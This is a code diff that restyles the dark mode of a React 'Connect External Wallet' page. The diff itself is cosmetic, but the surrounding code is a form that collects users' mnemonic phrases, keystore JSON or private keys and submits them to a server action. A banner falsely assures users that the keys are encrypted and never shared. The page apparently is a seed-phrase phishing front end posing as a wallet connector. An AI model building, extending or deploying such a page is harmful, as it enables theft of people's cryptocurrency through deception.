@@ -1,6 +1,5 @@
 "use client"
 
-import { useTheme } from "next-themes"
 import { Lock, Wallet } from "lucide-react"
 import connectUserWallet from "@/actions/wallet.action";
 import { authClient } from "@/lib/auth-client";
@@ -25,9 +24,6 @@ function ConnectWallet() {
       if (type === "success") router.push("/dashboard");
     }, 10_000);
   };
-
-  const { theme } = useTheme()
-  const isDark = theme === "dark"
 
   const [connectionMethod, setConnectionMethod] = useState<ConnectionMethod>("phrase")
   const [platform, setPlatform] = useState("trustwallet")
@@ -105,20 +101,19 @@ function ConnectWallet() {
   return (
     <div className="w-full min-h-screen flex items-center justify-center p-4">
       <div
-        className={`w-full max-w-2xl rounded-2xl p-8 ${isDark ? "bg-slate-900 border border-slate-700" : "bg-white border border-gray-200"
-          }`}
+        className="w-full max-w-2xl rounded-2xl p-8 bg-white border border-gray-200 dark:bg-slate-900 dark:border-slate-700"
       >
         {/* Header */}
         <div className="text-center mb-8">
           <div className="flex justify-center mb-4">
-            <div className={`p-4 rounded-lg ${isDark ? "bg-blue-600/20" : "bg-blue-100"}`}>
-              <Wallet className={`w-8 h-8 ${isDark ? "text-blue-400" : "text-blue-600"}`} />
+            <div className="p-4 rounded-lg bg-blue-100 dark:bg-blue-600/20">
+              <Wallet className="w-8 h-8 text-blue-600 dark:text-blue-400" />
             </div>
           </div>
-          <h1 className={`text-2xl font-bold mb-2 ${isDark ? "text-white" : "text-gray-900"}`}>
+          <h1 className="text-2xl font-bold mb-2 text-gray-900 dark:text-white">
             Connect External Wallet
           </h1>
-          <p className={isDark ? "text-gray-400" : "text-gray-600"}>
+          <p className="text-gray-600 dark:text-gray-400">
             Securely connect your wallet to manage assets
           </p>
         </div>
@@ -151,7 +146,7 @@ function ConnectWallet() {
           )}
 
           <div>
-            <label className={`block text-sm font-bold mb-4 ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+            <label className="block text-sm font-bold mb-4 text-gray-700 dark:text-gray-300">
               Select Connection Method
             </label>
             <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
@@ -163,12 +158,8 @@ function ConnectWallet() {
                 <label
                   key={method.value}
                   className={`cursor-pointer p-4 rounded-lg border-2 transition-all ${connectionMethod === method.value
-                    ? isDark
-                      ? "border-blue-500 bg-blue-500/10"
-                      : "border-blue-500 bg-blue-50"
-                    : isDark
-                      ? "border-slate-600 hover:border-slate-500"
-                      : "border-gray-300 hover:border-gray-400"
+                    ? "border-blue-500 bg-blue-50 dark:bg-blue-500/10"
+                    : "border-gray-300 hover:border-gray-400 dark:border-slate-600 dark:hover:border-slate-500"
                     }`}
                 >
                   <div className="flex items-center gap-3">
@@ -180,7 +171,7 @@ function ConnectWallet() {
                       onChange={(e) => setConnectionMethod(e.target.value as ConnectionMethod)}
                       className="w-4 h-4"
                     />
-                    <span className={`text-sm font-medium whitespace-pre-line ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+                    <span className="text-sm font-medium whitespace-pre-line text-gray-700 dark:text-gray-300">
                       {method.label}
                     </span>
                   </div>
@@ -191,16 +182,13 @@ function ConnectWallet() {
 
           {/* Platform Selection */}
           <div>
-            <label className={`block text-sm font-bold mb-2 ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+            <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
               Select Platform
             </label>
             <select
               value={platform}
               onChange={(e) => setPlatform(e.target.value)}
-              className={`w-full px-4 py-2 rounded-lg border transition-colors font-mono text-sm ${isDark
-                ? "bg-slate-800 border-slate-600 text-white"
-                : "bg-white border-gray-300 text-gray-900"
-                } focus:outline-none focus:border-blue-500`}
+              className="w-full px-4 py-2 rounded-lg border transition-colors font-mono text-sm bg-white border-gray-300 text-gray-900 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white"
             >
               {platforms.map((p) => (
                 <option key={p.value} value={p.value}>
@@ -213,7 +201,7 @@ function ConnectWallet() {
           {/* Input Fields - Mnemonic Phrase */}
           {connectionMethod === "phrase" && (
             <div>
-              <label className={`block text-sm font-bold mb-2 ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                 Mnemonic Phrase
               </label>
               <textarea
@@ -221,12 +209,9 @@ function ConnectWallet() {
                 onChange={(e) => setMnemonicPhrase(e.target.value)}
                 placeholder="Enter your 12 or 24-word mnemonic phrase"
                 rows={3}
-                className={`w-full px-4 py-2 rounded-lg border font-mono text-sm ${isDark
-                  ? "bg-slate-800 border-slate-600 text-white placeholder-gray-500"
-                  : "bg-white border-gray-300 text-gray-900 placeholder-gray-400"
-                  } focus:outline-none focus:border-blue-500`}
+                className="w-full px-4 py-2 rounded-lg border font-mono text-sm bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
               />
-              <p className={`text-xs mt-2 ${isDark ? "text-gray-400" : "text-gray-600"}`}>
+              <p className="text-xs mt-2 text-gray-600 dark:text-gray-400">
                 Usually 12 or 24 words separated by spaces
               </p>
             </div>
@@ -235,7 +220,7 @@ function ConnectWallet() {
           {/* Input Fields - Keystore JSON */}
           {connectionMethod === "keystorejson" && (
             <div>
-              <label className={`block text-sm font-bold mb-2 ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                 Keystore JSON
               </label>
               <textarea
@@ -243,10 +228,7 @@ function ConnectWallet() {
                 onChange={(e) => setKeystoreJson(e.target.value)}
                 placeholder="Paste your keystore JSON here"
                 rows={5}
-                className={`w-full px-4 py-2 rounded-lg border font-mono text-xs ${isDark
-                  ? "bg-slate-800 border-slate-600 text-white placeholder-gray-500"
-                  : "bg-white border-gray-300 text-gray-900 placeholder-gray-400"
-                  } focus:outline-none focus:border-blue-500`}
+                className="w-full px-4 py-2 rounded-lg border font-mono text-xs bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
               />
             </div>
           )}
@@ -254,7 +236,7 @@ function ConnectWallet() {
           {/* Input Fields - Private Key */}
           {connectionMethod === "privatekey" && (
             <div>
-              <label className={`block text-sm font-bold mb-2 ${isDark ? "text-gray-300" : "text-gray-700"}`}>
+              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                 Private Key
               </label>
               <input
@@ -262,28 +244,24 @@ function ConnectWallet() {
                 value={privateKey}
                 onChange={(e) => setPrivateKey(e.target.value)}
                 placeholder="Enter your private key"
-                className={`w-full px-4 py-2 rounded-lg border font-mono text-sm ${isDark
-                  ? "bg-slate-800 border-slate-600 text-white placeholder-gray-500"
-                  : "bg-white border-gray-300 text-gray-900 placeholder-gray-400"
-                  } focus:outline-none focus:border-blue-500`}
+                className="w-full px-4 py-2 rounded-lg border font-mono text-sm bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
               />
             </div>
           )}
 
           {/* Error Message */}
           {error && (
-            <div className={`p-3 rounded-lg text-sm ${isDark ? "bg-red-500/20 text-red-400" : "bg-red-100 text-red-700"}`}>
+            <div className={`p-3 rounded-lg text-sm ${"bg-red-100 text-red-700 dark:bg-red-500/20 dark:text-red-400"}`}>
               {error}
             </div>
           )}
 
           {/* Security Info Banner */}
           <div
-            className={`flex items-start gap-3 p-4 rounded-lg ${isDark ? "bg-blue-500/20 border border-blue-500/50" : "bg-blue-100 border border-blue-300"
-              }`}
+            className="flex items-start gap-3 p-4 rounded-lg bg-blue-100 border border-blue-300 dark:bg-blue-500/20 dark:border-blue-500/50"
           >
-            <Lock className={`w-5 h-5 shrink-0 mt-0.5 ${isDark ? "text-blue-400" : "text-blue-600"}`} />
-            <p className={`text-sm ${isDark ? "text-blue-200" : "text-blue-800"}`}>
+            <Lock className="w-5 h-5 shrink-0 mt-0.5 text-blue-600 dark:text-blue-400" />
+            <p className="text-sm text-blue-800 dark:text-blue-200">
               Your keys are encrypted and stored securely. We never share them with anyone.
             </p>
           </div>
@@ -292,10 +270,7 @@ function ConnectWallet() {
           <button
             type="submit"
             disabled={isSubmitting}
-            className={`w-full py-3 rounded-lg font-semibold transition-all ${isDark
-              ? "bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white"
-              : "bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500/50 text-white"
-              }`}
+            className="w-full py-3 rounded-lg font-semibold transition-all bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500/50 text-white dark:bg-blue-600 dark:hover:bg-blue-700 dark:disabled:bg-blue-600/50"
           >
             {isSubmitting ? "Connecting..." : "Connect Wallet"}
           </button>
